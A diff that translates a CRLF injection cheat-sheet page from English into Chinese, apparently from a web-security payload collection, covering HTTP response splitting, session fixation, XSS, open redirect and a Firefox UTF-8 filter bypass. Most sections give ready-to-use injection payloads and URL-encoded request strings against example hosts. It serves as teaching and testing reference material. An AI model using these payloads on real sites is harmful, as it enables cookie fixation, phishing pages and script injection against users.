@@ -1,35 +1,37 @@
-# Carriage Return Line Feed
+[原文文档](README.en.md)
 
-> CRLF Injection is a web security vulnerability that arises when an attacker injects unexpected Carriage Return (CR) (\r) and Line Feed (LF) (\n) characters into an application. These characters are used to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.
+# 回车换行注入
 
-## Summary
+> CRLF 注入是一种网络安全漏洞，当攻击者向应用程序注入意外的回车符（CR）(\r) 和换行符（LF）(\n) 时会产生。这些字符用于表示一行的结束和新一行的开始，常见于 HTTP、SMTP 等网络协议。在 HTTP 协议中，CR-LF 序列始终用于终止一行。
 
-* [Methodology](#methodology)
-    * [Session Fixation](#session-fixation)
-    * [Cross Site Scripting](#cross-site-scripting)
-    * [Open Redirect](#open-redirect)
-* [Filter Bypass](#filter-bypass)
-* [Labs](#labs)
-* [References](#references)
+## 摘要
 
-## Methodology
+* [方法论](#methodology)
+    * [会话固定](#session-fixation)
+    * [跨站脚本攻击](#cross-site-scripting)
+    * [开放重定向](#open-redirect)
+* [过滤器绕过](#filter-bypass)
+* [实验环境](#labs)
+* [参考资料](#references)
 
-HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.
+## 方法论
 
-**CRLF Characters**:
+HTTP 响应分割是一种安全漏洞，攻击者通过在响应头中注入回车符（CR）和换行符（LF）字符（统称为 CRLF）来操纵 HTTP 响应。这些字符标记 HTTP 响应中一个头的结束和新一行的开始。
 
-* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
-* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.
+**CRLF 字符**：
 
-By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:
+* `CR` (`\r`, ASCII 13): 将光标移动到行首。
+* `LF` (`\n`, ASCII 10): 将光标移动到下一行。
 
-* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
-* Cache Poisoning: Forcing incorrect content to be stored in caches.
-* Header Manipulation: Altering headers to mislead users or systems
+通过注入 CRLF 序列，攻击者可以将响应分成两部分，有效控制 HTTP 响应的结构。这可能导致各种安全问题，例如：
 
-### Session Fixation
+* 跨站脚本攻击（XSS）：在第二个响应中注入恶意脚本。
+* 缓存中毒：强制将错误内容存储在缓存中。
+* 头字段操作：更改头字段以误导用户或系统
 
-A typical HTTP response header looks like this:
+### 会话固定
+
+典型的 HTTP 响应头如下所示：
 
 ```http
 HTTP/1.1 200 OK
@@ -37,7 +39,7 @@ Content-Type: text/html
 Set-Cookie: sessionid=abc123
 ```
 
-If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:
+如果用户输入 `value\r\nSet-Cookie: admin=true` 被嵌入到头中而未经清理：
 
 ```http
 HTTP/1.1 200 OK
@@ -46,19 +48,19 @@ Set-Cookie: sessionid=value
 Set-Cookie: admin=true
 ```
 
-Now the attacker has set their own cookie.
+现在攻击者已经设置了他们自己的 Cookie。
 
-### Cross Site Scripting
+### 跨站脚本攻击
 
-Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).
+除了需要非常不安全的方式来处理用户会话的会话固定之外，利用 CRLF 注入的最简单方法是为页面写入新主体。它可以用于创建钓鱼页面或触发任意的 JavaScript 代码（XSS）。
 
-**Requested page**:
+**请求的页面**：
 
 ```http
 http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
 ```
 
-**HTTP response**:
+**HTTP 响应**：
 
 ```http
 Set-Cookie:en
@@ -72,15 +74,15 @@ Content-Length: 34
 <html>You have been Phished</html>
 ```
 
-In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .
+在 XSS 的情况下，CRLF 注入允许注入 `X-XSS-Protection` 头，值为 "0"，以禁用它。然后我们可以添加包含 JavaScript 代码的 HTML 标签。
 
-**Requested page**:
+**请求的页面**：
 
 ```powershell
 http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
 ```
 
-**HTTP Response**:
+**HTTP 响应**：
 
 ```http
 HTTP/1.1 200 OK
@@ -103,50 +105,50 @@ X-XSS-Protection:0
 0
 ```
 
-### Open Redirect
+### 开放重定向
 
-Inject a `Location` header to force a redirect for the user.
+注入 `Location` 头以强制用户重定向。
 
 ```ps1
 %0d%0aLocation:%20http://myweb.com
 ```
 
-## Filter Bypass
+## 过滤器绕过
 
-[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.
+[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) 规定大多数 HTTP 头字段值仅使用 US-ASCII 字符集的子集。
 
-> Newly defined header fields SHOULD limit their field values to US-ASCII octets.
+> 新定义的头字段应将其字段值限制为 US-ASCII 八位组。
 
-Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.
+Firefox 按照规范，在设置 Cookie 时会剥离任何超出范围的字符，而不是对它们进行编码。
 
-| UTF-8 Character | Hex | Unicode | Stripped |
+| UTF-8 字符 | 十六进制 | Unicode | 剥离后 |
 | --------- | --- | ------- | -------- |
 | `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
 | `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
 | `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
 | `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<)  |
 
-The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.
+UTF-8 字符 `嘊` 在其十六进制格式的最后部分包含 `0a`，Firefox 会将其转换为 `\n`。
 
-An example payload using UTF-8 characters would be:
+使用 UTF-8 字符的载荷示例：
 
 ```js
 嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
 ```
 
-URL encoded version
+URL 编码版本
 
 ```js
 %E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
 ```
 
-## Labs
+## 实验环境
 
-* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
+* [PortSwigger - 通过 CRLF 注入进行 HTTP/2 请求分割](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
 * [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)
 
-## References
+## 参考资料
 
-* [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://www.owasp.org/index.php/CRLF_Injection)
-* [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
-* [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1:192749)
+* [CRLF 注入 - CWE-93 - OWASP - 2022年5月20日](https://www.owasp.org/index.php/CRLF_Injection)
+* [Twitter 上的 CRLF 注入或为什么黑名单失败 - XSS Jigsaw - 2015年4月21日](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
+* [星巴克：[newscdn.starbucks.com] CRLF 注入，XSS - Bobrov - 2016年12月20日](https://vulners.com/hackerone/H1:192749)
